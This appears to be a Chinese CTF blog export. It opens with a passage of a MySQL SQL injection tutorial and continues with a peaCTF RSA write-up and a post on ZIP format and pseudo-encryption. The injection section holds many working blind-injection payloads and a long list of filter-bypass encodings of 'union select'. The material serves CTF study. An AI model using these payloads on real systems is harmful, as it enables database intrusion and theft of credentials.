012345678901234567890123456789 | 1234567  ||  4 | admin                          | 11111    ||  5 | admin                          | 222222   ||  6 | admin                          | 33333    |+----+--------------------------------+----------+6 rows in set (0.00 sec)</code></pre><p>在不知道字段值的情况下可以通过此种方法得到内容</p><pre><code>mysql&gt; select * from user where username = &apos;&apos; or if(1,1,0);+----+--------------------------------+----------+| id | username                       | password |+----+--------------------------------+----------+|  1 | admin                          | 1234567  ||  2 | 012345678901234567890123456789 | 1234567  ||  3 | 012345678901234567890123456789 | 1234567  ||  4 | admin                          | 11111    ||  5 | admin                          | 222222   ||  6 | admin                          | 33333    |+----+--------------------------------+----------+6 rows in set (0.00 sec)</code></pre><p><strong>字符串截取函数</strong> </p><p>substr(str,postion,lines) 从str的第postion个字符开始截取lines长度的字符。</p><p>substring(str,FROM pos FOR len),这里可以不使用逗号。这两个函数如果我们不指定长度就会返回从查到的第一个字符开始的剩下所有字符。</p><p>substring_index(str,关键字，关键字出现次数)。返回str满足出现次数的之前的字符(如果第三个参数是负数则倒着来)</p><pre><code>mysql&gt; select * from user where username = &apos;&apos; or if(substr((select username from user where id=1),1,1)=&apos;a&apos;,sleep(2),0);Empty set (12.00 sec)</code></pre><p>如果id=1的这条数据第一个字符为’a’，则sleep2s.</p><pre><code>select * from user where id = 1 and if(ascii(substr(database(),1,1))=116,sleep(2),null);Empty set (2.00 sec)</code></pre><p>逐字符查询数据库名。</p><p><strong>配合 case when…then…else…end 触发</strong> </p><pre><code> select case when username = &apos;admin&apos; then &apos;admin&apos; else &apos;xxx&apos; end from user;+----------------------------------------------------------+| case when username = &apos;admin&apos; then &apos;admin&apos; else &apos;xxx&apos; end |+----------------------------------------------------------+| admin                                                    || xxx                                                      || xxx                                                      || admin                                                    || admin                                                    || admin                                                    |+----------------------------------------------------------+6 rows in set (0.00 sec)</code></pre><p><strong>除了sleep之外的函数</strong></p><p><strong>BENCHMARK(count,expr)</strong></p><p>BENCHMARK()函数重复count次执行expr。它可以被用于计算MYSQL处理表达式的速度。结果值通常为0。</p><pre><code>select benchmark(10000000,sha(1));</code></pre><p>我们结合上面的语句</p><pre><code>select * from user where id = 1 and if(ascii(substr(database(),1,1))=116,benchmark(10000000,sha(1)),null);</code></pre><p>*<em>笛卡尔积 *</em></p><pre><code>select count(*) from information_schema.tables A,information_schema.tables B,information_schema.tables C;</code></pre><p>​    </p><p>通过计算来延时</p><pre><code>mysql&gt; select count(*) from user;+----------+| count(*) |+----------+|        6 |+----------+1 row in set (0.00 sec)mysql&gt; select count(*) from user A,user B;+----------+| count(*) |+----------+       36 |+----------+1 row in set (0.00 sec)mysql&gt; select count(*) from user A,user B,user C;+----------+| count(*) |+----------+|      216 |+----------+1 row in set (0.00 sec)例如：select * from user where id = 1 and if(ascii(substr(database(),1,1))=116,(select count(*) from information_schema.tables A,information_schema.tables B,information_schema.columns C),null);</code></pre><p>*<em>GET_LOCK *</em></p><p>GET_LOCK(str,timeout)</p><p>设法使字符串str给定的名字得到一个锁，超时为timeout秒.</p><p>select GET_LOCK(‘a’,1)</p><p>但是上锁后必须在使用长连接能开启两个会话的时候才起作用。</p><p>*<em>RLIKE *</em></p><p>通过rpad或repeat 构造长字符串，加以计算量大的pattern，通过repeat的参数控制延时长短。</p><p>   <code>select concat(rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;)) RLIKE &#39;(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+b&#39;;</code></p><h3 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h3><p><strong>函数</strong> </p><p>截取函数</p><pre><code>mid(column_name,start[,length])mysql&gt; select mid(&apos;abc&apos;,1,1);+----------------+| mid(&apos;abc&apos;,1,1) |+----------------+| a              |+----------------+1 row in set (0.00 sec)</code></pre><p>​<br>    left(str,lengt) 从左开始截取字符串<br>    right(str,length) 从右截取<br>    mysql&gt; select right(‘abcda’,3);<br>    +——————+<br>    | right(‘abcda’,3) |<br>    +——————+<br>    | cda              |<br>    +——————+<br>    1 row in set (0.00 sec)</p><pre><code>转ascii类型ascii(str)/ord(str)  返回字符串首字母的ascii值</code></pre><p>布尔盲注与时间盲注差别不大</p><p>常用payload </p><pre><code>ascii(substr((select password from user) from 1 for 1))&lt;127</code></pre><h2 id="Bypass"><a href="#Bypass" class="headerlink" title="Bypass"></a>Bypass</h2><h3 id="关键词过滤"><a href="#关键词过滤" class="headerlink" title="关键词过滤"></a>关键词过滤</h3><p>对于某些特定关键词过滤比如 from,union,select等我们可以通过双写或大小写混写进行绕过。</p><h4 id="union-select"><a href="#union-select" class="headerlink" title="union select"></a>union select</h4><p>以过滤 union select 为例</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><span class="line"> <span class="comment">/*!%55NiOn*/</span> <span class="comment">/*!%53eLEct*/</span></span><br><span class="line"> </span><br><span class="line"> %55nion(%53elect 1,2,3)<span class="comment">-- -</span></span><br><span class="line"> </span><br><span class="line"> +union+distinct+<span class="keyword">select</span>+</span><br><span class="line"> </span><br><span class="line"> +<span class="keyword">union</span>+<span class="keyword">distinctROW</span>+<span class="keyword">select</span>+</span><br><span class="line"> </span><br><span class="line"> <span class="comment">/**/</span><span class="comment">/*!12345UNION SELECT*/</span><span class="comment">/**/</span></span><br><span class="line"> </span><br><span class="line"> <span class="comment">/**/</span><span class="comment">/*!50000UNION SELECT*/</span><span class="comment">/**/</span></span><br><span class="line"> </span><br><span class="line"> <span class="comment">/**/</span><span class="keyword">UNION</span><span class="comment">/**/</span><span class="comment">/*!50000SELECT*/</span><span class="comment">/**/</span></span><br><span class="line"> </span><br><span class="line"> <span class="comment">/*!50000UniON SeLeCt*/</span></span><br><span class="line"> </span><br><span class="line"> <span class="keyword">union</span> <span class="comment">/*!50000%53elect*/</span></span><br><span class="line"> </span><br><span class="line"> +<span class="comment">#uNiOn+#sEleCt</span></span><br><span class="line"> </span><br><span class="line"> +<span class="comment">#1q%0AuNiOn all#qa%0A#%0AsEleCt</span></span><br><span class="line"> </span><br><span class="line"> <span class="comment">/*!%55NiOn*/</span> <span class="comment">/*!%53eLEct*/</span></span><br><span class="line"> </span><br><span class="line"> <span class="comment">/*!u%6eion*/</span> <span class="comment">/*!se%6cect*/</span></span><br><span class="line"> </span><br><span class="line"> +un<span class="comment">/**/</span>ion+se<span class="comment">/**/</span>lect</span><br><span class="line"> </span><br><span class="line"> uni%<span class="number">0</span>bon+se%<span class="number">0</span>blect</span><br><span class="line"> </span><br><span class="line"> %<span class="number">2</span>f**%<span class="number">2</span>funion%<span class="number">2</span>f**%<span class="number">2</span>fselect</span><br><span class="line"> </span><br><span class="line"> <span class="keyword">union</span>%<span class="number">23</span>foo*%<span class="number">2</span>F*bar%<span class="number">0</span>D%<span class="number">0</span>Aselect%<span class="number">23</span>foo%<span class="number">0</span>D%<span class="number">0</span>A</span><br><span class="line"> </span><br><span class="line"> <span class="keyword">REVERSE</span>(noinu)+<span class="keyword">REVERSE</span>(tceles)</span><br><span class="line"> </span><br><span class="line"> <span class="comment">/*--*/</span><span class="keyword">union</span><span class="comment">/*--*/</span><span class="keyword">select</span><span class="comment">/*--*/</span></span><br><span class="line"> </span><br><span class="line"> <span class="keyword">union</span> (<span class="comment">/*!/**/</span> <span class="keyword">SeleCT</span> */ <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>)</span><br><span class="line"> </span><br><span class="line"> <span class="comment">/*!union*/</span>+<span class="comment">/*!select*/</span></span><br><span class="line"> </span><br><span class="line"> <span class="keyword">union</span>+<span class="comment">/*!select*/</span></span><br><span class="line"> </span><br><span class="line"> <span class="comment">/**/</span><span class="keyword">union</span><span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span></span><br><span class="line"> </span><br><span class="line"> <span class="comment">/**/</span><span class="keyword">uNIon</span><span class="comment">/**/</span><span class="keyword">sEleCt</span><span class="comment">/**/</span></span><br><span class="line"> </span><br><span class="line"> <span class="comment">/**/</span><span class="comment">/*!union*/</span><span class="comment">/**/</span><span class="comment">/*!select*/</span><span class="comment">/**/</span></span><br><span class="line"> </span><br><span class="line"> <span class="comment">/*!uNIOn*/</span> <span class="comment">/*!SelECt*/</span></span><br><span class="line"> </span><br><span class="line"> +<span class="keyword">union</span>+<span class="keyword">distinct</span>+<span class="keyword">select</span>+</span><br><span class="line"> </span><br><span class="line"> +<span class="keyword">union</span>+<span class="keyword">distinctROW</span>+<span class="keyword">select</span>+</span><br><span class="line"> </span><br><span class="line"> +<span class="keyword">UnIOn</span>%<span class="number">0</span>d%<span class="number">0</span>aSeleCt%<span class="number">0</span>d%<span class="number">0</span>a</span><br><span class="line"> </span><br><span class="line"> <span class="keyword">UNION</span><span class="comment">/*&amp;test=1*/</span><span class="keyword">SELECT</span><span class="comment">/*&amp;pwn=2*/</span></span><br><span class="line"> </span><br><span class="line"> un?+un<span class="comment">/**/</span>ion+se<span class="comment">/**/</span>lect+</span><br><span class="line"> </span><br><span class="line"> +UNunionION+SEselectLECT+</span><br><span class="line"> </span><br><span class="line"> +uni%<span class="number">0</span>bon+se%<span class="number">0</span>blect+</span><br><span class="line"> </span><br><span class="line"> %<span class="number">252</span>f%<span class="number">252</span>a*/<span class="keyword">union</span>%<span class="number">252</span>f%<span class="number">252</span>a /<span class="keyword">select</span>%<span class="number">252</span>f%<span class="number">252</span>a*/</span><br><span class="line"> </span><br><span class="line"> /%<span class="number">2</span>A%<span class="number">2</span>A/<span class="keyword">union</span>/%<span class="number">2</span>A%<span class="number">2</span>A/<span class="keyword">select</span>/%<span class="number">2</span>A%<span class="number">2</span>A/</span><br><span class="line"> </span><br><span class="line"> %<span class="number">2</span>f**%<span class="number">2</span>funion%<span class="number">2</span>f**%<span class="number">2</span>fselect%<span class="number">2</span>f**%<span class="number">2</span>f</span><br><span class="line"> </span><br><span class="line"> <span class="keyword">union</span>%<span class="number">23</span>foo*%<span class="number">2</span>F*bar%<span class="number">0</span>D%<span class="number">0</span>Aselect%<span class="number">23</span>foo%<span class="number">0</span>D%<span class="number">0</span>A</span><br><span class="line"> </span><br><span class="line"> <span class="comment">/*!UnIoN*/</span><span class="keyword">SeLecT</span>+</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="comment">#Union Select by PASS with Url Encoded Method:</span></span><br><span class="line"> </span><br><span class="line">   %<span class="number">55</span>nion(%<span class="number">53</span>elect)</span><br><span class="line"> </span><br><span class="line">   <span class="keyword">union</span>%<span class="number">20</span><span class="keyword">distinct</span>%<span class="number">20</span><span class="keyword">select</span></span><br><span class="line"> </span><br><span class="line">   <span class="keyword">union</span>%<span class="number">20</span>%<span class="number">64</span>istinctRO%<span class="number">57</span>%<span class="number">20</span><span class="keyword">select</span></span><br><span class="line"> </span><br><span class="line">   <span class="keyword">union</span>%<span class="number">2053</span>elect</span><br><span class="line"> </span><br><span class="line">   %<span class="number">23</span>?%<span class="number">0</span>auion%<span class="number">20</span>?%<span class="number">23</span>?%<span class="number">0</span>aselect</span><br><span class="line"> </span><br><span class="line">   %<span class="number">23</span>?zen?%<span class="number">0</span>Aunion <span class="keyword">all</span>%<span class="number">23</span>zen%<span class="number">0</span>A%<span class="number">23</span>Zen%<span class="number">0</span>Aselect</span><br><span class="line"> </span><br><span class="line">   %<span class="number">55</span>nion %<span class="number">53</span>eLEct</span><br><span class="line"> </span><br><span class="line">   u%<span class="number">6</span>eion se%<span class="number">6</span>cect</span><br><span class="line"> </span><br><span class="line">   unio%<span class="number">6</span>e %<span class="number">73</span>elect</span><br><span class="line"> </span><br><span class="line">   unio%<span class="number">6</span>e%<span class="number">20</span>%<span class="number">64</span>istinc%<span class="number">74</span>%<span class="number">20</span>%<span class="number">73</span>elect</span><br><span class="line"> </span><br><span class="line">   uni%<span class="number">6</span>fn <span class="keyword">distinct</span>%<span class="number">52</span>OW s%<span class="number">65</span>lect</span><br><span class="line"> </span><br><span class="line">   %<span class="number">75</span>%<span class="number">6</span>e%<span class="number">6</span>f%<span class="number">69</span>%<span class="number">6</span>e %<span class="number">61</span>%<span class="number">6</span>c%<span class="number">6</span>c %<span class="number">73</span>%<span class="number">65</span>%<span class="number">6</span>c%<span class="number">65</span>%<span class="number">63</span>%<span class="number">7</span></span><br></pre></td></tr></table></figure><h4 id="空格"><a href="#空格" class="headerlink" title="空格"></a>空格</h4><p>空格绕过：<code>/\*\*/ /\*!\*/  %09 %0A %0B %0C %0D %A0 %20</code></p><p>在实际使用中我们也可以使用1个<code>*/</code>来闭合多个<code>/*!</code>.</p><pre><code>SELECT * from users where id = 1/*!union/*!select/*!1,(select/*!password/*!from/*!users/*!limit/*!1,1),3*/;+----+------------+----------+| id | username   | password |+----+------------+----------+|  1 | Dumb         | Dumb      ||  1 | I-kill-you | 3         |+----+------------+----------+</code></pre><h4 id="函数替换"><a href="#函数替换" class="headerlink" title="函数替换"></a>函数替换</h4><p>函数替换：</p><pre><code>mid(&apos;aaa&apos;,1,1) &lt;==&gt; left(&apos;aaa&apos;,1) &lt;==&gt; substr(&apos;aaa&apos;,1,1) &lt;==&gt; substring(&apos;aaa&apos;,1,1)concat(&apos;a&apos;,&apos;b&apos;,&apos;c&apos;) &lt;==&gt; group\_concat(&apos;a&apos;,&apos;b&apos;,&apos;c&apos;) &lt;==&gt;  concat\_ws(&apos;b&apos;,&apos;a&apos;,&apos;c&apos;)</code></pre><h4 id="逗号绕过"><a href="#逗号绕过" class="headerlink" title="逗号绕过"></a>逗号绕过</h4><p>union select 联合查询的逗号被过滤时我们可以使用<code>join</code>进行注入</p><pre><code>select * from emails where id = 1.1 union select * from (select 1)a join (select 2)b;</code></pre><p>字符串截取函数中的逗号绕过</p><p>m<code>id(&#39;abc&#39; from 1 for 1) &lt;==&gt; substr(&#39;abc&#39; from 1 for 1) &lt;==&gt; substring(&#39;abc&#39; from 1 for 1)</code></p><p>Limit中逗号绕过</p><pre><code>select * from emails limit 1,1; &lt;==&gt; select * from emails limit 1 offset 1;</code></pre><h4 id="绕过"><a href="#绕过" class="headerlink" title="=绕过"></a><code>=</code>绕过</h4><p>可以用like、regexp、rlike、in、between…and…绕过</p><h4 id="比较符绕过"><a href="#比较符绕过" class="headerlink" title="比较符绕过"></a>比较符绕过</h4><p>！= &lt;==&gt; &lt;&gt;</p><h3 id="关键函数过滤"><a href="#关键函数过滤" class="headerlink" title="关键函数过滤"></a>关键函数过滤</h3><h4 id="过滤-information"><a href="#过滤-information" class="headerlink" title="过滤 information"></a>过滤 information</h4><p>如果过滤了<code>information</code>关键字无法使用<code>information_schema.tables</code>等表的话我们可以通过innodb引擎进行注入。 在Mysql5.6以上版本中，系统Mysql库中存在两张与innodb相关的表 <code>innodb_table_stats</code> 和 <code>innodb_index_stats</code>。</p><pre><code>select group_concat(table_name) from mysql.innodb_table_stats where database_name=database();select group_concat(table_name) from mysql.innodb_index_stats where database_name=database();</code></pre><p>同时我们也可以通过查询一个不存在的自定义函数来获得数据库名</p><pre><code>select * from users where id=haa();ERROR 1305 (42000): FUNCTION security.haa does not exist</code></pre><p>爆列名使用<code>polygon</code>和<code>linestring</code>函数。翻阅文档可知</p><blockquote><p>Constructs a Polygon value from a number of LineString or WKB LineString arguments. If any argument does not represent a LinearRing (that is, not a closed and simple LineString), the return value is NULL. </p></blockquote><p>如果我们传入存在字段的话就会爆出库，表，列。</p><pre><code>mysql&gt; select * from users where id=1 and polygon(id);ERROR 1367 (22007): Illegal non geometric &apos;`security`.`users`.`id`&apos; value found during parsingmysql&gt; select * from users where id=1 and linestring(id);ERROR 1367 (22007): Illegal non geometric &apos;`security`.`users`.`id`&apos; value found during parsing</code></pre><p>爆字段名我们通过命名别名的方式。使用别名的时候表中不能出现相同的字段名，于是我们就利用join把表扩充成两份，在最后别名c的时候 查询到重复字段，就成功报错，从而爆出字段名，再使用<code>using</code>函数以此爆出其他字段名。</p><pre><code>mysql&gt; select * from users where id=1 and (select * from (select * from users as a join users as b)as c);ERROR 1060 (42S21): Duplicate column name &apos;id&apos;mysql&gt; select * from users where id=1 and (select * from (select * from users as a join users as b using(id))as c);ERROR 1060 (42S21): Duplicate column name &apos;username&apos;mysql&gt; select * from users where id=1 and (select * from (select * from users as a join users as b using(id,username))as c);ERROR 1060 (42S21): Duplicate column name &apos;password&apos;mysql&gt; select * from users where id=1 and (select * from (select * from users as a join users as b using(id,username,password))as c);ERROR 1241 (21000): Operand should contain 1 column(s)</code></pre><h4 id="过滤特定字段名"><a href="#过滤特定字段名" class="headerlink" title="过滤特定字段名"></a>过滤特定字段名</h4><p>如果过滤了字段名，比如 password 我们可以通过以下方法得到数据</p><pre><code>mysql&gt; select e.3 from (select * from (select 1)a,(select 2)b,(select 3)c union select * from users)e;+------------+| 3           |+------------+| 3           || Dumb        || I-kill-you || p@ssword   || crappy      || stupidity  || genious     || mob!le      || admin       || admin1      || admin2      || admin3      || dumbo       || admin4      || 789          |+------------+mysql&gt; select * from users where id=1 union select 1,(select e.3 from (select * from (select 1)a,(select 2)b,(select 3)c union select * from users)e limit 1 offset 2),3;+----+------------+----------+| id | username   | password |+----+------------+----------+|  1 | Dumb         | Dumb      ||  1 | I-kill-you | 3         |+----+------------+----------+</code></pre><p>原理是通过建立虚表e，虚表e里的第三列储存了password字段信息，我们通过偏移来使该字段信息显示在没被过滤的username字段中。</p><h4 id="盲注-1"><a href="#盲注-1" class="headerlink" title="盲注"></a>盲注</h4><p>还有一种方法是盲注</p><p>现在我们的表里有一条数据</p><pre><code>mysql&gt; select * from users where id=15;+----+----------+----------+| id | username | password |+----+----------+----------+| 15 | admin#   | 789  |+----+----------+----------+</code></pre><p>我们通过盲注的方式进行查询。</p><pre><code>mysql&gt; select * from users where id=15 union select 1,2,0x38 order by 3 desc;+----+----------+----------+| id | username | password |+----+----------+----------+|  1 | 2        | 8        || 15 | admin#   | 789      |+----+----------+----------+2 rows in set (0.00 sec)    mysql&gt; select * from users where id=15 union select 1,2,0x37 order by 3 desc;+----+----------+----------+| id | username | password |+----+----------+----------+| 15 | admin#   | 789  ||  1 | 2| 7|+----+----------+----------+2 rows in set (0.00 sec)mysql&gt; select * from users where id=15 union select 1,2,0x36 order by 3 desc;+----+----------+----------+| id | username | password |+----+----------+----------+| 15 | admin#   | 789      ||  1 | 2        | 6        |+----+----------+----------+2 rows in set (0.00 sec)</code></pre><p>order by 3 desc 表示对第三栏进行降序排列。而mysql在比较的时候是从左到右按照字符的ASCII码来比较。</p><p>从结果我们可以看出union select 0x38 时username 回显2,union select 0x37 时username 回显 admin#,union select 0x36时 username 回显admin#,也就是说password的第一位是0x37，也就是7.于是，我们可以通过写脚本来爆破这个位置的值。</p><h4 id="字符编码错误"><a href="#字符编码错误" class="headerlink" title="字符编码错误"></a>字符编码错误</h4><p>有时在注入的最后一步</p><p><code>-1&#39; union select 1, flag from user%23</code></p><p>查数据时会遇到以下错误</p><p><code>Illegal mix of collations (gbk_chinese_ci,IMPLICIT) and (latin1_swedish_ci,IMPLICIT) for operation &#39;UNION&#39;</code></p><p>原因 union 操作时使用的 select 操作对象必须有相同数量的列，也必须有相同的数据类型，因此数据类型的不同造成了上述错误，我们可以使用 16 进制过渡一下</p><p><code>-1&#39; union select 1, hex(flag) from user%23</code></p><p>之后将得到的结果再转回来即可</p><p>参考链接</p><blockquote><p><a href="https://www.secpulse.com/archives/68991.html" target="_blank" rel="noopener">https://www.secpulse.com/archives/68991.html</a></p><p><a href="https://xz.aliyun.com/t/5505#toc-3" target="_blank" rel="noopener">https://xz.aliyun.com/t/5505#toc-3</a></p><p><a href="https://xz.aliyun.com/t/253" target="_blank" rel="noopener">https://xz.aliyun.com/t/253</a></p><p><a href="http://www.zhutougg.com/2017/04/25/mysqlshu-ju-ku-de-innodbyin-qing-de-zhu-ru/" target="_blank" rel="noopener">http://www.zhutougg.com/2017/04/25/mysqlshu-ju-ku-de-innodbyin-qing-de-zhu-ru/</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SQL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>peaCTF WP</title>
      <link href="/2019/07/26/peaCTF-WP/"/>
      <url>/2019/07/26/peaCTF-WP/</url>
      
        <content type="html"><![CDATA[<p>和同学报名了这个比赛，全英文果然有压力，半天找不到怎么答题，哭了😭</p><a id="more"></a><h2 id="RSA"><a href="#RSA" class="headerlink" title="RSA"></a>RSA</h2><p>题目描述：Can you help Bob retrieve the two messages for a flag? Authenticated Channel Encrypted Channel</p><p>给了两个文件 auth_channel.txt 和  enc_channel.txt</p><pre><code>Authenticated (unhashed) channel:n = 59883006898206291499785811163190956754007806709157091648869e = 65537c = 23731413167627600089782741107678182917228038671345300608183Encrypted channel:n = 165481207658568424313022356820498512502867488746572300093793e = 65537c = 150635433712900935381157860417761227624682377134647578768653</code></pre><p>先分解两个n得到两对p&amp;q</p><pre><code>p = 192355607880290234740980693973q = 311314068553039667905603427153p1 = 404796306518120759733507156677q1 = 408801179738927870766525808109</code></pre><p>对两个文件分别进行常规解密</p><pre><code>import gmpy2n1 = 165481207658568424313022356820498512502867488746572300093793e1 = 65537c1 = 150635433712900935381157860417761227624682377134647578768653p1 = 404796306518120759733507156677q1 = 408801179738927870766525808109phin1 = (p-1)*(q-1)d1 = gmpy2.invert(e,phin)m1 = gmpy2.powmod(c,d,n)print mflag = hex(m)[2:]print flag.decode(&apos;hex&apos;)</code></pre><p>发现只有第二个文件可以正常解密</p><pre><code>8904929771347223901285886734450peaCTF{f4ct0r</code></pre><p>第一个文件报错，奇数长度无法正常decode。</p><p>这个地方卡了一会，还尝试拼接了两段m，哈哈。</p><p>最后看文件名发现是auth，想到RSA数字签名，尝试数字签名解，打印出pow的16进制数据后在数据最后有一个大写的L<code>0x316e67317366756e7dL</code>，遂删掉。将新得到的数据再次解密得到flag的后半段。</p><pre><code>peaCTF{f4ct0r1ng1sfun}</code></pre><h2 id="The-Wondeful-Wizard"><a href="#The-Wondeful-Wizard" class="headerlink" title="The Wondeful Wizard"></a>The Wondeful Wizard</h2><p>打开文件就是一张图片，图片扔进stegslove里跑一下各通道，在蓝色通道发现三行字符串，明显的16进制，试了试解前两个发现是fl,于是菜鸡的我手敲进代码里进行16进制解密</p><p>运行结果：</p><p><img src="http://wx1.sinaimg.cn/mw690/006boCb9ly1g5kb70a11oj30ki0kp41e.jpg" alt></p>]]></content>
      
      
      <categories>
          
          <category> WP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WP </tag>
            
            <tag> RSA </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ZIP&#39;s things</title>
      <link href="/2019/03/23/ZIP%E4%BC%AA%E5%8A%A0%E5%AF%86/"/>
      <url>/2019/03/23/ZIP%E4%BC%AA%E5%8A%A0%E5%AF%86/</url>
      
        <content type="html"><![CDATA[<p>只要我E的够快，寂寞就追不上我！</p><p>对不起，走错片场了~😄</p><a id="more"></a><p>##0x01 zip文件组成 ##</p><p><strong>压缩源文件数据区+压缩源文件目录区+压缩源文件目录结束标志</strong></p><h3 id="1-压缩源文件数据区"><a href="#1-压缩源文件数据区" class="headerlink" title="1 压缩源文件数据区"></a>1 压缩源文件数据区</h3><p>在这个数据区中每个压缩文件的源文件/目录都是一条记录，记录格式如下[文件头+文件数据+数据描述符]</p><h4 id="文件头结构"><a href="#文件头结构" class="headerlink" title="文件头结构"></a>文件头结构</h4><hr><pre><code>      组成    　                长度  文件头标记                  4 bytes  (0x04034b50)  解压文件所需 pkware 版本    2 bytes 全局方式位标记              2 bytes压缩方式                    2 bytes最后修改文件时间             2 bytes最后修改文件日期             2 bytesCRC-32校验                  4 bytes压缩后尺寸                  4 bytes未压缩尺寸                  4 bytes文件名长度                  2 bytes  扩展记录长度                2 bytes文件名                     （不定长度）扩展字段                   （不定长度）</code></pre><h4 id="文件数据"><a href="#文件数据" class="headerlink" title="文件数据"></a>文件数据</h4><p>就是数据</p><h4 id="数据描述符"><a href="#数据描述符" class="headerlink" title="数据描述符"></a>数据描述符</h4><hr><pre><code> 　　　组成    　长度CRC-32校验                  4 bytes压缩后尺寸                   4 bytes未压缩尺寸                   4 bytes</code></pre><p>这个数据描述符只在全局方式位标记的第三位设为1时才存在，紧接在压缩数据的最后一个字节后。</p><h3 id="2-压缩源文件目录区"><a href="#2-压缩源文件目录区" class="headerlink" title="2.压缩源文件目录区"></a>2.压缩源文件目录区</h3><p>在这个数据区中每一条记录对应在压缩源文件区中的一条数据</p><hr><pre><code>   　　　组成               　            长度　　目录中文件文件头标记             4 bytes  (0x02014b50)　　压缩使用的　pkware 版本          2 bytes　　解压文件所需 pkware 版本         2 bytes　　全局方式位标记                   2 bytes　　压缩方式                        2 bytes　　最后修改文件时间                 2 bytes　　最后修改文件日期                 2 bytes　　ＣＲＣ－３２校验                 4 bytes　　压缩后尺寸                      4 bytes　　未压缩尺寸                      4 bytes　　文件名长度                      2 bytes　　扩展字段长度                    2 bytes　　文件注释长度                    2 bytes　　磁盘开始号                      2 bytes　　内部文件属性                    2 bytes　　外部文件属性                    4 bytes局部头部偏移量                  4 bytes　　文件名                       （不定长度）　　扩展字段                     （不定长度）文件注释                     （不定长度）</code></pre><h3 id="3-压缩源文件目录结束标志"><a href="#3-压缩源文件目录结束标志" class="headerlink" title="3.压缩源文件目录结束标志"></a>3.压缩源文件目录结束标志</h3><hr><pre><code>　　　组成               　          长度目录结束标记                    4 bytes  (0x02014b50)当前磁盘编号                    2 bytes目录区开始磁盘编号              2 bytes　　本磁盘上纪录总数                 2 bytes　　目录区中纪录总数                 2 bytes　　目录区尺寸大小                   4 bytes　　目录区对第一张磁盘的偏移量        4 bytes　　ZIP 文件注释长度                 2 bytes　　ZIP 文件注释                   （不定长度）</code></pre><p>这里可以注意到文件目录结束标志只有22位，如果超出这部分则可能是隐藏数据(今天真的是被桂电的MISC给虐哭了/(ㄒoㄒ)/~~)。</p><h2 id="0x02-ZIP伪加密"><a href="#0x02-ZIP伪加密" class="headerlink" title="0x02 ZIP伪加密"></a>0x02 ZIP伪加密</h2><p><img src="http://wx4.sinaimg.cn/mw690/006boCb9ly1g5kazyuumnj30gx0de41x.jpg" alt></p><p>压缩源文件数据区–头文件标志：50 4B 03 04</p><p>压缩源文件目录区：</p><ul><li>目录中文件文件头标志：50 4B 01 02</li><li>压缩使用的pkware:     3F 00</li><li>紧跟着是解压文件所需要的pkware版本：14 00</li><li>全局方式位标记：00 00(更改这里进行伪加密，改为09 00就会提示有密码，实际上只要是以奇数结尾即可)</li></ul><p>压缩源文件目录结束标志：50 4B 05 06</p><p><img src="http://wx4.sinaimg.cn/mw690/006boCb9ly1g5kb023lp3j30gx0d4jug.jpg" alt></p><p>如何判断伪加密？</p><p>无加密</p><p>压缩源文件数据区的全局加密应当为00 00<br>且压缩源文件目录区的全局方式位标记应当为00 00</p><p>假加密</p><p>压缩源文件数据区的全局加密应当为00 